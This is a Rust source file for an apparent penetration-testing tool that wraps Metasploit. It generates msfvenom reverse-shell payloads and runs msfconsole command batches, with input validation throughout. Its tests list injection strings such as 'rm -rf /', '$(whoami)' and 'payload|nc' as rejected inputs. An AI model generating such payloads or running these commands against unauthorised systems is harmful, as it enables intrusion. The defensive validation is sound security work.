//! Metasploit Framework - exploitation and payload generation
//!
//! Drives the Metasploit Framework in one-shot batch mode only. Pick's runner
//! spawns a process, runs it to completion, and captures stdout — there is no
//! place for a persistent `msfrpcd`, an interactive `msfconsole` session, or a
//! live meterpreter shell. This wrapper therefore exposes exactly two batch
//! workflows:
//!
//!   * `mode="payload"` — generate a payload with `msfvenom` and report the
//!     output path plus a stdout/stderr summary.
//!   * `mode="resource"` — run a non-interactive resource script through
//!     `msfconsole -q -r <file> -x "exit -y"`.
//!
//! Everything is passed as an argv vector (never a shell string), and every
//! operator-supplied value is validated against a conservative allowlist before
//! it reaches the process boundary.

use async_trait::async_trait;
use pentest_core::error::Result;
use pentest_core::provenance::Provenance;
use pentest_core::tools::{
    execute_timed_with_provenance, ExternalDependency, ParamType, PentestTool, Platform,
    ToolCategory, ToolContext, ToolParam, ToolResult, ToolSchema,
};
use pentest_core::validation::validate_target;
use pentest_platform::{get_platform, CommandExec};
use serde_json::{json, Value};
use std::time::Duration;

use super::runner::param_str_or;
use crate::provenance_support::format_full_command;
use crate::util::param_u64;

/// Default msfvenom output format when the caller does not specify one.
const DEFAULT_FORMAT: &str = "raw";

pub struct MetasploitTool;

#[async_trait]
impl PentestTool for MetasploitTool {
    fn name(&self) -> &str {
        "metasploit"
    }

    fn description(&self) -> &str {
        "Metasploit Framework in one-shot batch mode (no persistent sessions). \
         mode='payload' generates a payload with msfvenom (payload, lhost, lport, \
         format, optional output_path). mode='resource' runs a non-interactive \
         resource script (commands = list of msfconsole commands). \
         Reports the output path / script result and a stdout-stderr summary."
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema::new(self.name(), self.description())
            .external_dependency(
                ExternalDependency::new(
                    "msfconsole",
                    "metasploit",
                    "Metasploit Framework - exploitation and payload generation",
                )
                .custom_installer("metasploit")
                .category(ToolCategory::Exploitation)
                .recommended(false),
            )
            .param(ToolParam::required(
                "mode",
                ParamType::String,
                "Batch mode: 'payload' (msfvenom payload generation) or 'resource' \
                 (non-interactive msfconsole resource script).",
            ))
            .param(ToolParam::optional(
                "payload",
                ParamType::String,
                "[payload mode] Payload to generate (e.g. 'windows/x64/meterpreter/reverse_tcp'). \
                 Allowlist: alphanumeric, '/', '_', '-' only.",
                json!(""),
            ))
            .param(ToolParam::optional(
                "lhost",
                ParamType::String,
                "[payload mode] Listener host: an IP address or hostname.",
                json!(""),
            ))
            .param(ToolParam::optional(
                "lport",
                ParamType::Integer,
                "[payload mode] Listener port (1-65535).",
                json!(4444),
            ))
            .param(ToolParam::optional(
                "format",
                ParamType::String,
                "[payload mode] Output format (e.g. 'exe', 'raw', 'python'). Default 'raw'.",
                json!(DEFAULT_FORMAT),
            ))
            .param(ToolParam::optional(
                "output_path",
                ParamType::String,
                "[payload mode] Optional output file path. Defaults to /tmp/msf-payload.<ext>.",
                json!(""),
            ))
            .param(ToolParam::optional(
                "commands",
                ParamType::Array,
                "[resource mode] Array of msfconsole commands to run non-interactively. \
                 Each entry must be non-empty with no newlines or shell metacharacters.",
                json!([]),
            ))
            .param(ToolParam::required(
                "timeout",
                ParamType::Integer,
                "Timeout in seconds. MUST be set explicitly. Use 60 for payload generation, \
                 300+ for resource scripts.",
            ))
            .platforms(vec![Platform::Desktop, Platform::Tui])
    }

    fn supported_platforms(&self) -> Vec<Platform> {
        vec![Platform::Desktop, Platform::Tui]
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> Result<ToolResult> {
        execute_timed_with_provenance(|| async move {
            let platform = get_platform();
            let timeout_secs = param_u64(&params, "timeout", 60);

            let mode = param_str_or(&params, "mode", "");
            match mode.as_str() {
                "payload" => run_payload(&platform, &params, timeout_secs).await,
                "resource" => run_resource(&platform, &params, timeout_secs).await,
                other => Err(pentest_core::error::Error::InvalidParams(format!(
                    "Invalid mode '{other}': expected 'payload' or 'resource'"
                ))),
            }
        })
        .await
    }
}

/// Generate a payload with `msfvenom` and report the output path plus a summary.
async fn run_payload<P: CommandExec>(
    platform: &P,
    params: &Value,
    timeout_secs: u64,
) -> Result<(Value, Provenance)> {
    let payload = param_str_or(params, "payload", "");
    let lhost = param_str_or(params, "lhost", "");
    let format = param_str_or(params, "format", DEFAULT_FORMAT);
    let output_path = param_str_or(params, "output_path", "");
    let lport = param_u64(params, "lport", 0);

    let spec = PayloadSpec::build(&payload, &lhost, lport, &format, &output_path)?;
    let args = spec.to_args();
    let args_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();

    let result = platform
        .execute_command("msfvenom", &args_refs, Duration::from_secs(timeout_secs))
        .await?;

    let data = json!({
        "mode": "payload",
        "payload": spec.payload,
        "lhost": spec.lhost,
        "lport": spec.lport,
        "format": spec.format,
        "output_path": spec.output_path,
        "summary": format!(
            "Generated {} payload ({}) -> {}",
            spec.payload, spec.format, spec.output_path
        ),
        "stdout": result.stdout,
        "stderr": result.stderr,
    });

    let full_command = format_full_command("msfvenom", &args);
    let provenance = Provenance::new(
        "metasploit",
        "metasploit-framework",
        pentest_core::provenance::ProbeCommand::from_exact(full_command)
            .with_description(format!("msfvenom payload generation ({})", spec.payload)),
        pentest_core::provenance::truncate_excerpt(&result.stdout),
    );

    Ok((data, provenance))
}

/// Run a non-interactive batch of msfconsole commands.
///
/// The commands are passed through msfconsole's own `-x` one-liner (joined with
/// `;`, which msfconsole — not a shell — parses), with a trailing `exit -y`.
/// This avoids writing a `.rc` file: a host-side temp file would not be visible
/// to msfconsole when it runs inside the bwrap/proot sandbox (which can have an
/// isolated `/tmp`). The joined string is a single argv element, so it is never
/// shell-interpreted by us; each command is still metacharacter-validated.
async fn run_resource<P: CommandExec>(
    platform: &P,
    params: &Value,
    timeout_secs: u64,
) -> Result<(Value, Provenance)> {
    let commands = parse_commands(params)?;

    let args = resource_args(&commands);
    let args_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();

    let result = platform
        .execute_command("msfconsole", &args_refs, Duration::from_secs(timeout_secs))
        .await?;

    let data = json!({
        "mode": "resource",
        "commands": commands,
        "summary": format!("Ran {} msfconsole command(s)", commands.len()),
        "stdout": result.stdout,
        "stderr": result.stderr,
    });

    let full_command = format_full_command("msfconsole", &args);
    let provenance = Provenance::new(
        "metasploit",
        "metasploit-framework",
        pentest_core::provenance::ProbeCommand::from_exact(full_command).with_description(format!(
            "msfconsole resource script ({} command(s))",
            commands.len()
        )),
        pentest_core::provenance::truncate_excerpt(&result.stdout),
    );

    Ok((data, provenance))
}

/// A validated msfvenom payload-generation specification.
struct PayloadSpec {
    payload: String,
    lhost: String,
    lport: u64,
    format: String,
    output_path: String,
}

impl PayloadSpec {
    /// Validate every operator-supplied field and resolve the output path.
    fn build(
        payload: &str,
        lhost: &str,
        lport: u64,
        format: &str,
        output_path: &str,
    ) -> Result<Self> {
        let payload = payload.trim();
        if payload.is_empty() {
            return Err(pentest_core::error::Error::InvalidParams(
                "payload is required for mode='payload'".into(),
            ));
        }
        if !is_allowed_payload(payload) {
            return Err(pentest_core::error::Error::InvalidParams(format!(
                "Invalid payload '{payload}': only alphanumeric, '/', '_', '-' allowed"
            )));
        }

        // lhost must be a real IP or hostname (also rejects metacharacters).
        let lhost = validate_target(lhost)?;

        validate_lport(lport)?;

        let format = format.trim();
        let format = if format.is_empty() {
            DEFAULT_FORMAT
        } else {
            format
        };
        reject_metacharacters(format, "format")?;

        let output_path = output_path.trim();
        let output_path = if output_path.is_empty() {
            format!("/tmp/msf-payload.{format}")
        } else {
            reject_metacharacters(output_path, "output_path")?;
            // Constrain writes to /tmp/ so a crafted output_path can't clobber
            // arbitrary host/sandbox files (e.g. /root/.ssh/authorized_keys).
            // Also block ".." so the prefix can't be escaped via traversal.
            if !output_path.starts_with("/tmp/") || output_path.contains("..") {
                return Err(pentest_core::error::Error::InvalidParams(
                    "output_path must be under /tmp/ and may not contain '..'".into(),
                ));
            }
            output_path.to_string()
        };

        Ok(Self {
            payload: payload.to_string(),
            lhost,
            lport,
            format: format.to_string(),
            output_path,
        })
    }

    /// Build the msfvenom argv vector for this specification.
    fn to_args(&self) -> Vec<String> {
        vec![
            "-p".to_string(),
            self.payload.clone(),
            format!("LHOST={}", self.lhost),
            format!("LPORT={}", self.lport),
            "-f".to_string(),
            self.format.clone(),
            "-o".to_string(),
            self.output_path.clone(),
        ]
    }
}

/// Conservative allowlist for payload identifiers: alphanumeric, '/', '_', '-'.
fn is_allowed_payload(payload: &str) -> bool {
    !payload.is_empty()
        && payload
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '_' | '-'))
}

/// Validate that an lport is within the legal 1-65535 range.
fn validate_lport(lport: u64) -> Result<()> {
    if (1..=65535).contains(&lport) {
        Ok(())
    } else {
        Err(pentest_core::error::Error::InvalidParams(format!(
            "Invalid lport {lport}: must be between 1 and 65535"
        )))
    }
}

/// Reject shell metacharacters defensively even though args are passed as an
/// argv vector (never a shell string). Mirrors `zap::sanitize_target_url`.
fn reject_metacharacters(value: &str, field: &str) -> Result<()> {
    if value.chars().any(|c| {
        matches!(
            c,
            ';' | '&' | '|' | '`' | '$' | '<' | '>' | '\n' | '\r' | '\\' | '"' | '\''
        )
    }) {
        return Err(pentest_core::error::Error::InvalidParams(format!(
            "{field} contains invalid characters"
        )));
    }
    Ok(())
}

/// Extract and validate the `commands` array for mode='resource'.
fn parse_commands(params: &Value) -> Result<Vec<String>> {
    let raw = params
        .get("commands")
        .and_then(|v| v.as_array())
        .ok_or_else(|| {
            pentest_core::error::Error::InvalidParams(
                "commands must be a non-empty array of strings for mode='resource'".into(),
            )
        })?;

    let mut commands = Vec::with_capacity(raw.len());
    for entry in raw {
        let cmd = entry.as_str().ok_or_else(|| {
            pentest_core::error::Error::InvalidParams("commands entries must be strings".into())
        })?;
        let cmd = cmd.trim();
        if cmd.is_empty() {
            return Err(pentest_core::error::Error::InvalidParams(
                "commands entries must be non-empty".into(),
            ));
        }
        // Entries are written into a file, but still validate so a hostile
        // command can never inject extra lines or shell metacharacters.
        reject_metacharacters(cmd, "commands")?;
        commands.push(cmd.to_string());
    }

    if commands.is_empty() {
        return Err(pentest_core::error::Error::InvalidParams(
            "commands must contain at least one command for mode='resource'".into(),
        ));
    }

    Ok(commands)
}

/// Build the msfconsole argv vector for a non-interactive command batch.
///
/// Commands are joined with `; ` and a trailing `exit -y` is appended, all as a
/// single `-x` argument. msfconsole parses the `;`-separated list itself; this
/// is not a shell invocation, and each command was metacharacter-validated by
/// [`parse_commands`].
fn resource_args(commands: &[String]) -> Vec<String> {
    let mut oneliner = commands.join("; ");
    if !oneliner.is_empty() {
        oneliner.push_str("; ");
    }
    oneliner.push_str("exit -y");
    vec!["-q".to_string(), "-x".to_string(), oneliner]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validate_lport_accepts_in_range_bounds() {
        assert!(validate_lport(1).is_ok());
        assert!(validate_lport(4444).is_ok());
        assert!(validate_lport(65535).is_ok());
    }

    #[test]
    fn validate_lport_rejects_out_of_range() {
        assert!(validate_lport(0).is_err());
        assert!(validate_lport(65536).is_err());
        assert!(validate_lport(100000).is_err());
    }

    #[test]
    fn payload_allowlist_accepts_real_payload_names() {
        assert!(is_allowed_payload("windows/x64/meterpreter/reverse_tcp"));
        assert!(is_allowed_payload("linux/x86/shell_reverse_tcp"));
        assert!(is_allowed_payload("php/meterpreter-reverse_tcp"));
    }

    #[test]
    fn payload_allowlist_rejects_metacharacters_and_empty() {
        assert!(!is_allowed_payload(""));
        assert!(!is_allowed_payload("windows/x64; rm -rf /"));
        assert!(!is_allowed_payload("payload$(whoami)"));
        assert!(!is_allowed_payload("a b"));
        assert!(!is_allowed_payload("payload|nc"));
    }

    #[test]
    fn reject_metacharacters_flags_shell_chars() {
        for bad in [
            "exe; rm -rf /",
            "`whoami`",
            "$(id)",
            "a|b",
            "a&b",
            "line1\nline2",
            "back\\slash",
            "quote\"d",
            "quote'd",
        ] {
            assert!(
                reject_metacharacters(bad, "x").is_err(),
                "should reject {bad}"
            );
        }
        assert!(reject_metacharacters("exe", "x").is_ok());
        assert!(reject_metacharacters("/tmp/msf-payload.raw", "x").is_ok());
    }

    #[test]
    fn payload_spec_build_rejects_bad_lhost_metacharacters() {
        let err = PayloadSpec::build(
            "windows/x64/meterpreter/reverse_tcp",
            "10.0.0.1; rm -rf /",
            4444,
            "exe",
            "",
        );
        assert!(err.is_err());
    }

    #[test]
    fn payload_spec_build_rejects_bad_lport() {
        let err = PayloadSpec::build(
            "windows/x64/meterpreter/reverse_tcp",
            "10.0.0.1",
            0,
            "exe",
            "",
        );
        assert!(err.is_err());
    }

    #[test]
    fn payload_spec_build_defaults_output_path_to_format_extension() {
        let spec = PayloadSpec::build(
            "windows/x64/meterpreter/reverse_tcp",
            "10.0.0.1",
            4444,
            "exe",
            "",
        )
        .unwrap();
        assert_eq!(spec.output_path, "/tmp/msf-payload.exe");
        assert_eq!(spec.format, "exe");
    }

    #[test]
    fn payload_spec_build_defaults_empty_format_to_raw() {
        let spec = PayloadSpec::build(
            "linux/x64/meterpreter/reverse_tcp",
            "192.168.1.5",
            8080,
            "",
            "",
        )
        .unwrap();
        assert_eq!(spec.format, "raw");
        assert_eq!(spec.output_path, "/tmp/msf-payload.raw");
    }

    #[test]
    fn payload_spec_to_args_builds_expected_argv() {
        let spec = PayloadSpec::build(
            "windows/x64/meterpreter/reverse_tcp",
            "10.0.0.1",
            4444,
            "exe",
            "/tmp/out.exe",
        )
        .unwrap();
        assert_eq!(
            spec.to_args(),
            vec![
                "-p",
                "windows/x64/meterpreter/reverse_tcp",
                "LHOST=10.0.0.1",
                "LPORT=4444",
                "-f",
                "exe",
                "-o",
                "/tmp/out.exe",
            ]
        );
    }

    #[test]
    fn payload_spec_build_rejects_output_path_outside_tmp() {
        // Arbitrary-write guard: only /tmp/ is allowed, and no traversal.
        for bad in ["/root/.ssh/authorized_keys", "/etc/passwd", "/tmp/../etc/x"] {
            let err = PayloadSpec::build(
                "linux/x64/meterpreter/reverse_tcp",
                "10.0.0.1",
                4444,
                "elf",
                bad,
            );
            assert!(err.is_err(), "should reject output_path {bad}");
        }
        // A legitimate /tmp/ path is accepted.
        assert!(PayloadSpec::build(
            "linux/x64/meterpreter/reverse_tcp",
            "10.0.0.1",
            4444,
            "elf",
            "/tmp/payload.elf",
        )
        .is_ok());
    }

    #[test]
    fn parse_commands_accepts_valid_command_list() {
        let params = json!({"commands": ["use exploit/multi/handler", "set LHOST 10.0.0.1"]});
        let commands = parse_commands(&params).unwrap();
        assert_eq!(commands.len(), 2);
        assert_eq!(commands[0], "use exploit/multi/handler");
    }

    #[test]
    fn parse_commands_rejects_missing_empty_and_non_array() {
        assert!(parse_commands(&json!({})).is_err());
        assert!(parse_commands(&json!({"commands": []})).is_err());
        assert!(parse_commands(&json!({"commands": "not an array"})).is_err());
        assert!(parse_commands(&json!({"commands": [""]})).is_err());
        assert!(parse_commands(&json!({"commands": ["   "]})).is_err());
        assert!(parse_commands(&json!({"commands": [123]})).is_err());
    }

    #[test]
    fn parse_commands_rejects_newlines_and_metacharacters() {
        assert!(parse_commands(&json!({"commands": ["use x\nrun"]})).is_err());
        assert!(parse_commands(&json!({"commands": ["run; rm -rf /"]})).is_err());
        assert!(parse_commands(&json!({"commands": ["echo `id`"]})).is_err());
    }

    #[test]
    fn resource_args_joins_commands_into_oneliner_with_exit() {
        let commands = vec!["use exploit/multi/handler".to_string(), "run".to_string()];
        assert_eq!(
            resource_args(&commands),
            vec!["-q", "-x", "use exploit/multi/handler; run; exit -y",]
        );
    }

    #[tokio::test]
    async fn execute_rejects_invalid_mode_with_invalid_params() {
        let tool = MetasploitTool;
        let params = json!({"mode": "interactive", "timeout": 60});
        let result = tool.execute(params, &ToolContext::default()).await.unwrap();
        // execute_timed_with_provenance maps the Err into an error ToolResult.
        assert!(!result.success);
        let err = result.error.unwrap();
        assert!(err.contains("Invalid mode"), "unexpected error: {err}");
    }
}
